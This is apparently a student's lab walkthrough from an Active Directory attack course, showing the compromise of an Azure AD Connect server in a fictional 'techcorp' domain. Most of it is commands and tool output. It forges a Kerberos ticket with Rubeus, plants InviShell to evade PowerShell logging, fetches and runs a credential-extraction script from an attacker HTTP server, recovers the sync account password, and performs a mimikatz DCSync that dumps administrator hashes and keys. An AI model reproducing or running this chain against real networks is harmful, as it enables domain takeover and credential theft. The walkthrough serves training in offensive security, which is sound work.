# Hands-On 19:

```
Find out the machine where Azure AD Connect is installed.
Compromise the machine and extract the password of AD Connect user in clear-text.
Using the AD Connect user's password, extract secrets from us-dc and techcorp-dc.
```

## Index Of Content:

  1. [Find Machine Azure AD](#find-machine-azure-ad)
  2. [Compromise machine](#compromise-machine)
  3. [Extract secrets](#extract-secrets)

## Find Machine Azure AD

```
PS C:\Users\studentuser17> Get-ADUser -Filter "SamAccountName -like '*'" -Server techcorp.local -Properties *| select  SamAccountName, Description | fl


SamAccountName : Administrator
Description    : Built-in account for administering the computer/domain

SamAccountName : Guest
Description    : Built-in account for guest access to the computer/domain

SamAccountName : krbtgt
Description    : Key Distribution Center Service Account

SamAccountName : US$
Description    :

SamAccountName : MSOL_16fb75d0227d
Description    : Account created by Microsoft Azure Active Directory Connect with installation identifier 16fb75d0227d4957868d5c4ae0688943 running on computer US-ADCONNECT configured to synchronize to tenant
                 techcorpus.onmicrosoft.com. This account must have directory replication permissions in the local Active Directory and write permission on certain attributes to enable Hybrid Deployment.

SamAccountName : $431000-R3GTAO0291F9
Description    :

SamAccountName : SM_6fcd6ac55a6146a0a
Description    :

SamAccountName : SM_154a18cd4a8e48f09
Description    :

SamAccountName : SM_01a48ed0a28c423d9
Description    :

SamAccountName : SM_37c4dd3af61044398
Description    :

SamAccountName : SM_8b0a3d48bd2541249
Description    :

SamAccountName : SM_8bf409db7e874ebe9
Description    :

SamAccountName : SM_73d4ee9dc8674c898
Description    :

SamAccountName : SM_eca5036b49c740608
Description    :

SamAccountName : SM_309ad2430f0b4251b
Description    :

SamAccountName : USVENDOR$
Description    :

SamAccountName : BASTION$
Description    :

SamAccountName : privuser
Description    :

SamAccountName : testuser
Description    :

```

## Compromise machine

Request Kerberos TGT, for helpdesk admin
```
C:\AD\Tools\Rubeus.exe asktgt /domain:us.techcorp.local /user:helpdeskadmin /aes256:f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534 /opsec /createonly:C:\Windows\System32\cmd.exe /show /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using domain controller: US-DC.us.techcorp.local (192.168.1.2)
[!] Pre-Authentication required!
[!]     AES256 Salt: US.TECHCORP.LOCALhelpdeskadmin
[*] Using aes256_cts_hmac_sha1 hash: f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534
[*] Building AS-REQ (w/ preauth) for: 'us.techcorp.local\helpdeskadmin'
[*] Using domain controller: 192.168.1.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      EVVTLlRFQ0hDT1JQLkxPQ0FM
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/US.TECHCORP.LOCAL
  ServiceRealm             :  US.TECHCORP.LOCAL
  UserName                 :  helpdeskadmin
  UserRealm                :  US.TECHCORP.LOCAL
  StartTime                :  2/27/2023 12:05:39 PM
  EndTime                  :  2/27/2023 10:05:39 PM
  RenewTill                :  3/6/2023 12:05:39 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  Ayo7g2rahNEEg2Noe5j5D272H3uPYdttZvf8RIx1a/c=
  ASREP (key)              :  F3AC0C70B3FDB36F25C0D5C9CC552FE9F94C39B705C4088A2BB7219AE9FB6534

```
Copy Invishishell:

```
C:\Users\studentuser17>echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\us-adconnect\C$\Users\helpdeskadmin\Downloads\InshellProf.dll
Does \\us-adconnect\C$\Users\helpdeskadmin\Downloads\InshellProf.dll specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\InviShell\InShellProf.dll
1 File(s) copied

>echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\us-adconnect\C$\Users\helpdeskadmin\Downloads\RunWithRegistryNonAdmin.bat
Does \\us-adconnect\C$\Users\helpdeskadmin\Downloads\RunWithRegistryNonAdmin.bat specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
1 File(s) copied

```
Access and load invishishell:

```
C:\Users\helpdeskadmin>cd Downloads
cd Downloads

C:\Users\helpdeskadmin\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 88AD-6C8B

 Directory of C:\Users\helpdeskadmin\Downloads

02/27/2023  12:09 PM    <DIR>          .
02/27/2023  12:09 PM    <DIR>          ..
12/31/2020  02:14 AM           117,248 InshellProf.dll
12/31/2020  02:16 AM               544 RunWithRegistryNonAdmin.bat
               2 File(s)        117,792 bytes
               2 Dir(s)  13,990,985,728 bytes free

C:\Users\helpdeskadmin\Downloads>.\RunWithRegistryNonAdmin.bat
.\RunWithRegistryNonAdmin.bat

C:\Users\helpdeskadmin\Downloads>set COR_ENABLE_PROFILING=1

C:\Users\helpdeskadmin\Downloads>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

C:\Users\helpdeskadmin\Downloads>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
The operation completed successfully.

C:\Users\helpdeskadmin\Downloads>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
The operation completed successfully.

C:\Users\helpdeskadmin\Downloads>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\Users\helpdeskadmin\Downloads\InShellProf.dll" /f
The operation completed successfully.

C:\Users\helpdeskadmin\Downloads>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.


```
## Extract secrets

From the attacker student machine launch SImpleHTTPServer in python:
```
C:\AD\Tools>python -m SimpleHTTPServer 8989
Serving HTTP on 0.0.0.0 port 8989 ...
192.168.1.209 - - [28/Feb/2023 11:04:00] "GET /adconnect.ps1 HTTP/1.1" 200 -

```

On the ad-connector machine load directly in memory fileless the following ADconnector script:

```
IEX(New-Object Net.webclient).DownloadString("http://192.168.100.17:8989/adconnect.ps1")
IEX(New-Object Net.webclient).DownloadString("http://192.168.100.17:8989/adconnect.ps1")
PS C:\Users\helpdeskadmin\Downloads> ADConnect
ADConnect
AD Connect Sync Credential Extract POC (@_xpn_)

AD Connect Sync Credential Extract v2 (@_xpn_)
        [ Updated to support new cryptokey storage method ]

[*] Querying ADSync localdb (mms_server_configuration)
[*] Querying ADSync localdb (mms_management_agent)
[*] Using xp_cmdshell to run some Powershell as the service user
[*] Credentials incoming...

Domain: techcorp.local
Username: MSOL_16fb75d0227d
Password: 70&n1{p!Mb7K.C)/USO.a{@m*%.+^230@KAc[+sr}iF>Xv{1!{=/}}3B.T8IW-{)^Wj^zbyOc=Ahi]n=S7K$wAr;sOlb7IFh}!%J.o0}?zQ8]fp&.5w+!!IaRSD@qYf
```
Using the stracted MSQL user credentials from adconnector on techcorp.local domain, from elevated privileges shell:

```
C:\Windows\system32>runas /user:techcorp.local\MSOL_16fb75d0227d /netonly cmd
Enter the password for techcorp.local\MSOL_16fb75d0227d:
Attempting to start cmd as user "techcorp.local\MSOL_16fb75d0227d" ...

```
This command spawn a new cmd with the Administrator premissions on the student machine and allow the attacker dump the techcorp administrator credentials with a dcsync attack using SafetyKatz:

```
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:techcorp\administrator /domain:techcorp.local" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /user:techcorp\administrator /domain:techcorp.local
[DC] 'techcorp.local' will be the domain
[DC] 'Techcorp-DC.techcorp.local' will be the DC server
[DC] 'techcorp\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 7/4/2019 2:01:32 AM
Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: bc4cf9b751d196c4b6e1a2ba923ef33f
    ntlm- 0: bc4cf9b751d196c4b6e1a2ba923ef33f
    ntlm- 1: c87a64622a487061ab81e51cc711a34b
    lm  - 0: 6ac43f8c5f2e6ddab0f85e76d711eab8

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : f94f43f24957c86f1a2d359b7585b940

* Primary:Kerberos-Newer-Keys *
    Default Salt : TECHCORP.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 58db3c598315bf030d4f1f07021d364ba9350444e3f391e167938dd998836883
      aes128_hmac       (4096) : 1470b3ca6afc4146399c177ab08c5d29
      des_cbc_md5       (4096) : c198a4545e6d4c94
    OldCredentials
      aes256_hmac       (4096) : 9de1b687c149f44ccf5bb546d7c5a6eb47feab97bc34380ee54257024a43caf0
      aes128_hmac       (4096) : f7996a1b81e251f7eb2cceda64f7a2ff
      des_cbc_md5       (4096) : 386b3de03ecb62df

* Primary:Kerberos *
    Default Salt : TECHCORP.LOCALAdministrator
    Credentials
      des_cbc_md5       : c198a4545e6d4c94
    OldCredentials
      des_cbc_md5       : 386b3de03ecb62df

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  f4e3c69dc427ef76903a65e2848b0f4c
    02  bf5ea8567f6fd1ef7f257304278a6e52
    03  b3ed9e4019c9c725ae929d0b73cbd852
    04  f4e3c69dc427ef76903a65e2848b0f4c
    05  5c0f8ba64238288eff440c01bbe81a5e
    06  dcc7e5185c6c279b3d10b20af1994cbb
    07  50e4e0f1db674508a890e22751797889
    08  f0fd75f91cf2843531ff58d83a85b84e
    09  bd49a7a6232f85a5b8d8edb68786032b
    10  6aabbb1d7742272ceff856b907c5c9ba
    11  3a21402317ce21660b2ccb899d783ea3
    12  f0fd75f91cf2843531ff58d83a85b84e
    13  04f3c03fd2e53ee67fbece68ce267134
    14  9a08da7d88d88f8e3b307adee818cc6e
    15  da942a6b569ef74ecb675359bc2784eb
    16  f783eb704fa6677368309688a31efc97
    17  2e4abf671ea3bba742e340f2b25a3970
    18  e60715ae3f9dc9d75b3c4aabf36d7a30
    19  f0d4e1439ff5452f1a0fffb97e04524e
    20  816fb1f321fd9e6936bc86db53375242
    21  4e29af591c5b9fc1837a19ec61433da9
    22  e238e557513d21c02e67134fd5209e01
    23  db8ad27d9ed2dc8fa35d3c546d896b60
    24  2c89e15382d83a0e7007b916c5f21925
    25  60b33decd4f178a2417b0dc9e776ad3e
    26  55584de6c6a3c05c519cbbf35478bbfa
    27  c790bb64ca16391e1e9b15c9cb0aad68
    28  067ef368529b0ba16bcfd1276c306aea
    29  438b45e36bd633e4bedbb3748f3d0c4d


mimikatz(commandline) # exit
Bye!

```
